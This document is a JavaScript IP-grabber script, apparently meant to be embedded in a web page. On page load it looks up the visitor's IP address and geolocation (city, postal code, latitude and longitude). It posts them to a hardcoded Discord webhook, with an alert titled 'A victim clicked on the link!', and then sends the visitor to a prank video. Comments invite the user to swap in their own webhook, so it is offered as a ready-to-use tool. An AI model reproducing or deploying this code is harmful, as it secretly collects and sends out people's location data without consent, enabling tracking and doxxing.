const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1467170434704478262/bCmTKceRfd0JZ-IeARx48mEydx5C_bds9uccBn2XnV4KUCHOPDBwmrDidC4L6JWgcpYd'; // replace with your webhook url
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "Alejandro Cayo", // optionally changeable
                            avatar_url: "https://cdn.discordapp.com/attachments/1439142327271821372/1452764126400086026/file_00000000bce471f79c796b82328d3737.png?ex=694aff86&is=6949ae06&hm=4e840e2924c6c16ad96b3a72c21d668131430925cb7e8545aca017da983569aa&", // optionally changeable
                            content: `@here`,
                            embeds: [
                                {
                                    title: 'A victim clicked on the link!',
                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                    color: 0x800080 // optionally changeable
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP()

document.getElementById("indez").addEventListener("click", function () {
    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
});
